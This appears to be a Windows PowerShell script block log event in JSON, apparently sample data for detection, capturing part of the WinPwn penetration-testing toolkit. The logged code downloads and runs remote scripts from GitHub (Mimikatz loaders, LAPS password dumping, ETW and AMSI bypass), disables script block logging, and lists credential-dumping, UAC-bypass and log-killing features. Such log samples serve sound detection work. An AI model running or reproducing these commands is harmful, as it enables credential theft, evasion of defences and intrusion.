{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-PowerShell",
          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
        }
      },
      "EventID": 4104,
      "Version": 1,
      "Level": 3,
      "Task": 2,
      "Opcode": 15,
      "Keywords": "0x0",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2025-12-23T12:25:40.169471Z"
        }
      },
      "EventRecordID": 3168,
      "Correlation": {
        "#attributes": {
          "ActivityID": "B908F131-6DEE-0001-A801-39B9EE6DDC01"
        }
      },
      "Execution": {
        "#attributes": {
          "ProcessID": 23052,
          "ThreadID": 9920
        }
      },
      "Channel": "Microsoft-Windows-PowerShell/Operational",
      "Computer": "swachchhanda",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-21-2555720767-1205513275-3893774561-1001"
        }
      }
    },
    "EventData": {
      "MessageNumber": 14,
      "MessageTotal": 14,
      "ScriptBlockText": "                                            $IncludeProgram | ForEach-Object {\r\n                                                if ($DisplayName -notlike $_) {\r\n                                                    $DisplayName = $null\r\n                                                }\r\n                                            }\r\n                                        }\r\n                                    }\r\n\r\n                                    if ($ExcludeProgram) {\r\n                                        if ($ProgramRegExMatch) {\r\n                                            $ExcludeProgram | ForEach-Object {\r\n                                                if ($DisplayName -match $_) {\r\n                                                    $DisplayName = $null\r\n                                                }\r\n                                            }\r\n                                        } else {\r\n                                            $ExcludeProgram | ForEach-Object {\r\n                                                if ($DisplayName -like $_) {\r\n                                                    $DisplayName = $null\r\n                                                }\r\n                                            }\r\n                                        }\r\n                                    }\r\n\r\n                                    if ($DisplayName) {\r\n                                        if ($Property) {\r\n                                            foreach ($CurrentProperty in $Property) {\r\n                                                $HashProperty.$CurrentProperty = ($RegBase.OpenSubKey(\"$CurrentReg$_\")).GetValue($CurrentProperty)\r\n                                            }\r\n                                        }\r\n                                        if ($LastAccessTime) {\r\n                                            $InstallPath = ($RegBase.OpenSubKey(\"$CurrentReg$_\")).GetValue('InstallLocation') -replace '\\\\$',''\r\n                                            if ($InstallPath) {\r\n                                                $WmiSplat = @{\r\n                                                    ComputerName = $Computer\r\n                                                    Query        = $(\"ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile\")\r\n                                                    ErrorAction  = 'SilentlyContinue'\r\n                                                }\r\n                                                $HashProperty.LastAccessTime = Get-WmiObject @WmiSplat |\r\n                                                    Where-Object {$_.Extension -eq 'exe' -and $_.LastAccessed} |\r\n                                                    Sort-Object -Property LastAccessed |\r\n                                                    Select-Object -Last 1 | ForEach-Object {\r\n                                                        $_.ConvertToDateTime($_.LastAccessed)\r\n                                                    }\r\n                                            } else {\r\n                                                $HashProperty.LastAccessTime = $null\r\n                                            }\r\n                                        }\r\n                                        \r\n                                        if ($psversiontable.psversion.major -gt 2) {\r\n                                            [pscustomobject]$HashProperty\r\n                                        } else {\r\n                                            New-Object -TypeName PSCustomObject -Property $HashProperty |\r\n                                            Select-Object -Property $SelectProperty\r\n                                        }\r\n                                    }\r\n                                    $socket.Close()\r\n                                }\r\n\r\n                            }\r\n\r\n                        }\r\n\r\n                    }\r\n                }\r\n            } catch {\r\n                Write-Error $_\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nfunction Lapschecks\r\n{\r\n    [CmdletBinding()]\r\n    Param (\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput,\r\n        [Switch]\r\n        $passworddump   \r\n    )\r\n    if(!$consoleoutput){pathcheck}\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n\r\n    if ($passworddump)\r\n    {\r\n        IEX ($viewdevobfs)\r\n        if(!$consoleoutput){breviaries -Properties DnsHostName,ms-Mcs-AdmPwd >> \"$currentPath\\Exploitation\\LapsPasswords.txt\"}else{Write \"-------> Dumping LAPS passwords:\";breviaries -Properties DnsHostName,ms-Mcs-AdmPwd}\r\n    }\r\n\r\n    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/LAPSToolkit.ps1')\r\n    Write-Host \"Checking for LAPS enabled Computers.\"\r\n    if(!$consoleoutput){Get-LAPSComputers >> \"$currentPath\\DomainRecon\\LapsInformations.txt\"}else{Write \"-------> LAPS Computers:\";Get-LAPSComputers}\r\n    Write-Host \"Checking for LAPS Administrator groups.\"\r\n    if(!$consoleoutput){Find-LAPSDelegatedGroups >> \"$currentPath\\DomainRecon\\LapsAllowedAdminGroups.txt\"}else{Write \"-------> LAPS Groups:\";Find-LAPSDelegatedGroups}\r\n    Write-Host \"Checking for special right users with access to laps passwords.\"\r\n    if(!$consoleoutput){Find-AdmPwdExtendedRights >> \"$currentPath\\DomainRecon\\LapsSpecialRights.txt\"}else{Write \"-------> LAPS ADM Extended Rights:\";Find-AdmPwdExtendedRights}\r\n}\r\n\r\nfunction fruit\r\n{\r\n   $network = Read-Host -Prompt 'Please enter the CIDR for the network: (example: 192.168.0.0/24)'\r\n   Write-Host -ForegroundColor Yellow 'Searching...'\r\n   iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Find-Fruit.ps1')\r\n   Find-Fruit -FoundOnly -Rhosts $network\r\n   pause;    \r\n}\r\n\r\nfunction Mimiload\r\n{\r\n  iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/loadmimi.ps1')\r\n  mimiload\r\n}\r\n\r\nfunction BlockEtw\r\n{\r\n  iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-BlockETW.ps1')\r\n  Invoke-BlockETW\r\n}\r\n    \r\nfunction WinPwn\r\n{\r\n    <#\r\n        .DESCRIPTION\r\n        Main Function. Executes the other functions according to the users input.\r\n        Author: @S3cur3Th1sSh1t\r\n        License: BSD 3-Clause\r\n    #>\r\n         [CmdletBinding()]\r\n    Param (\r\n    [alias(\"help\")][Switch]$h,\r\n\t[String]\r\n        $repo,\r\n        [Switch]\r\n        $noninteractive,\r\n        [Switch]\r\n        $consoleoutput,\r\n        [Switch]\r\n        $Domainrecon,\r\n        [Switch]\r\n        $Localrecon,\r\n        [Switch]\r\n        $Privesc,\r\n        [Switch]\r\n        $PowerSharpPack,\r\n        [Switch]\r\n        $Uacbypass,\r\n        [string]\r\n        $command,\r\n        [string]\r\n        $technique,\r\n        [switch]\r\n        $credentialmanager,\r\n        [switch]\r\n        $mimikittie,\r\n        [switch]\r\n        $rundll32lsass,\r\n        [switch]\r\n        $lazagne,\r\n        [switch]\r\n        $browsercredentials,\r\n        [switch]\r\n        $mimikittenz,\r\n        [switch]\r\n        $wificredentials,\r\n        [switch]\r\n        $samdump,\r\n        [switch]\r\n        $sharpcloud   \r\n    )\r\n  scriptblocklogbypass\r\n  \r\n  @'\r\n\r\n             \r\n__        ___       ____                 \r\n\\ \\      / (_)_ __ |  _ \\__      ___ __  \r\n \\ \\ /\\ / /| | '_ \\| |_) \\ \\ /\\ / | '_ \\ \r\n  \\ V  V / | | | | |  __/ \\ V  V /| | | |\r\n   \\_/\\_/  |_|_| |_|_|     \\_/\\_/ |_| |_|\r\n\r\n   --> Automate some internal Penetrationtest processes\r\n\r\n'@\r\n\r\n  $Help = \"\r\n\r\n\r\n    Usage:\r\n\r\n\r\n\r\n    WinPwn without any parameters is meant to be used in an interactive shell. There is a guided menu - no need for explanations.\r\n\r\n    However you can pass several parameters to use it from your favorite C2-Framework. \r\n\r\n    -noninteractive \t-> No questions for functions so that they run with predefined or user defined parameters  \r\n            \r\n    -consoleoutput    -> The loot/report folders are not created. Every function returns the output to the console so that you can take a look at everything in the Agent logs of your C2-Framework \r\n\r\n    -repo\t-> Choose your own offline repo to use all those nice scripts in an environment without internet for example \r\n\r\n    Examples:\r\n\r\n\r\n\r\n    WinPwn -noninteractive -consoleoutput -DomainRecon \t\t-> This will return every single domain recon script and function and will probably give you really much output\r\n\r\n    WinPwn -noninteractive -consoleoutput -Localrecon \t\t-> This will enumerate as much information for the local system as possible\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t   \r\n    Generalrecon -noninteractive\t\t\t\t\t\t\t-> Execute basic local recon functions and store the output in the corresponding folders\r\n\r\n    UACBypass -noninteractive -command 'C:\\temp\\stager.exe' -technique ccmstp\t-> Execute a stager in  a high integrity process from a low privileged session\r\n    Kittielocal -noninteractive -consoleoutput -browsercredentials\t\t\t\t-> Dump Browser-Credentials via Sharpweb returning the output to console\r\n    Kittielocal -noninteractive -browsercredentials\t\t\t\t\t\t\t\t-> Dump SAM File NTLM-Hashes and store the output in a file\r\n    WinPwn -PowerSharpPack -consoleoutput -noninteractive\t\t\t\t\t    -> Execute Seatbelt, PowerUp, Watson and more C# binaries in memory\r\n    WinPwn -repo http://192.168.1.10:8000/WinPwn_Repo\t-> Execute WinPwn from a local repo. To create such a repo use the Get_WinPwn_Repo.sh script.\r\n  \"\r\n  if($h){return $Help}\r\n\t\r\n    if(!$consoleoutput)\r\n    {\r\n        dependencychecks\r\n        pathcheck\r\n    }\r\n    $currentPath = (Get-Item -Path \".\\\" -Verbose).FullName\r\n    AmsiBypass\r\n\t\r\n\t#Added repo parameter by 0x23353435\r\n\tIf ($repo)\r\n    {\r\n    $Script:S3cur3Th1sSh1t_repo = $repo\r\n    }\r\n    else\r\n    {\r\n    $Script:S3cur3Th1sSh1t_repo = \"https://raw.githubusercontent.com/S3cur3Th1sSh1t\"\r\n    }\r\n\t\r\n    BlockEtw\r\n\t\r\n\r\n    if ($noninteractive)\r\n    {\r\n        if ($Domainrecon)\r\n        {\r\n            if(!$consoleoutput){domainreconmodules -noninteractive}else{domainreconmodules -noninteractive -consoleoutput}\r\n        }\r\n        if ($Localrecon)\r\n        {\r\n            if(!$consoleoutput){localreconmodules -noninteractive}else{localreconmodules -noninteractive -consoleoutput}\r\n        }\r\n        if ($Privesc)\r\n        {\r\n            if(!$consoleoutput){privescmodules -noninteractive}else{privescmodules -noninteractive -consoleoutput}\r\n        }\r\n        if ($PowerSharpPack)\r\n        {\r\n            if(!$consoleoutput){sharpcradle -allthosedotnet -noninteractive}else{sharpcradle -allthosedotnet -noninteractive -consoleoutput}\r\n        }\r\n        if ($Uacbypass)\r\n        {\r\n            if (\"ccmstp\", \"DiskCleanup\", \"magic\" -notcontains $technique)\r\n            {\r\n                Write-Host \"Invalid technique, choose from ccmstp DiskCleanup or magic\"\r\n                return\r\n            }\r\n            UACBypass -noninteractive -command $command -technique $technique\r\n        }\r\n        if ($credentialmanager)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -credentialmanager}else{kittielocal -noninteractive -credentialmanager -consoleoutput}\r\n        }\r\n        if($mimikittie)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -mimikittie}else{kittielocal -noninteractive -mimikittie -consoleoutput}\r\n        }\r\n        if($rundll32lsass)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -rundll32lsass}else{kittielocal -noninteractive -rundll32lsass -consoleoutput}\r\n        }\r\n        if($lazagne)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -lazagne}else{kittielocal -noninteractive -lazagne -consoleoutput}\r\n        }\r\n        if($browsercredentials)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -browsercredentials}else{kittielocal -noninteractive -browsercredentials -consoleoutput}\r\n        }\r\n        if($mimikittenz)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -mimikittenz}else{kittielocal -noninteractive -mimikittenz -consoleoutput}\r\n        }\r\n        if($wificredentials)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -wificredentials}else{kittielocal -noninteractive -wificredentials -consoleoutput}\r\n        }\r\n        if ($samdump)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -samdump}else{kittielocal -noninteractive -samdump -consoleoutput}\r\n        }\r\n        if ($sharpcloud)\r\n        {\r\n            if(!$consoleoutput){kittielocal -noninteractive -sharpcloud}else{kittielocal -noninteractive -sharpcloud -consoleoutput}\r\n        } \r\n        return;\r\n    }\r\n\r\n    do\r\n    {\r\n        Write-Host \"================ WinPwn ================\"\r\n        Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNS/LLMNR/mDNS/NBNS spoofer! '\r\n        Write-Host -ForegroundColor Green '2. Local recon menu! '\r\n        Write-Host -ForegroundColor Green '3. Domain recon menu! '\r\n        Write-Host -ForegroundColor Green '4. Local privilege escalation check menu! '\r\n        Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows vulnerabilities! '\r\n\tWrite-Host -ForegroundColor Green '6. Bypass UAC! '\r\n\tWrite-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '\r\n        Write-Host -ForegroundColor Green '8. Kerberoasting! '\r\n        Write-Host -ForegroundColor Green '9. Loot local Credentials! '\r\n        Write-Host -ForegroundColor Green '10. Create an ADIDNS node or remove it! '\r\n        Write-Host -ForegroundColor Green '11. Sessiongopher! '\r\n        Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '\r\n\tWrite-Host -ForegroundColor Green '13. PowerSharpPack menu!'\r\n\tWrite-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'\r\n\tWrite-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'\r\n\tWrite-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'\r\n\tWrite-Host -ForegroundColor Green '17. Dump lsass via various techniques!'\r\n        Write-Host -ForegroundColor Green '18. Exit. '\r\n        Write-Host \"================ WinPwn ================\"\r\n        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'\r\n\r\n        Switch ($masterquestion) \r\n        {\r\n\t\t\t1{Inveigh}\r\n\t\t\t2{localreconmodules}\r\n\t\t\t3{domainreconmodules}\r\n\t\t\t4{privescmodules}\r\n\t\t\t5{kernelexploits}\r\n\t\t\t6{UACBypass}\r\n\t\t\t7{SYSTEMShell}\r\n\t\t\t8{kerberoasting}\r\n\t\t\t9{kittielocal}\r\n\t\t\t10{adidnsmenu}\r\n\t\t\t11{sessionGopher}\r\n                        12{inv-phantom}\r\n                        13{sharpcradle -allthosedotnet}\r\n\t\t\t14{sharpcradle -web}\r\n                        15{domainpassspray}\r\n\t\t\t16{mimiload}\r\n\t\t\t17{lsassdumps}\r\n    }\r\n    }\r\n  While ($masterquestion -ne 18)\r\n     \r\n   \r\n}\r\n\r\n$Certify = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')\r\n$SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SystemDirectoryServicesProtocols-Import.ps1')\r\n$viewdevobfs = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/viewdevobfs.ps1')\r\n$admodule = (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ADModuleImport.ps1')\r\n\r\nfunction scriptblocklogbypass\r\n{\r\n  $GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').\"GetFie`ld\"('cachedGroupPolicySettings', 'N'+'onPublic,Static')\r\n  If ($GroupPolicyField) {\r\n        $GroupPolicyCache = $GroupPolicyField.GetValue($null)\r\n        If ($GroupPolicyCache['ScriptB'+'lockLogging']) {\r\n            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0\r\n            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0\r\n        }\r\n        $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()\r\n        $val.Add('EnableScriptB'+'lockLogging', 0)\r\n        $val.Add('EnableScriptB'+'lockInvocationLogging', 0)\r\n        $GroupPolicyCache['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging'] = $val\r\n  }\r\n}",
      "ScriptBlockId": "0047f305-d1db-422c-a99f-b44ff657547e",
      "Path": ""
    }
  }
}
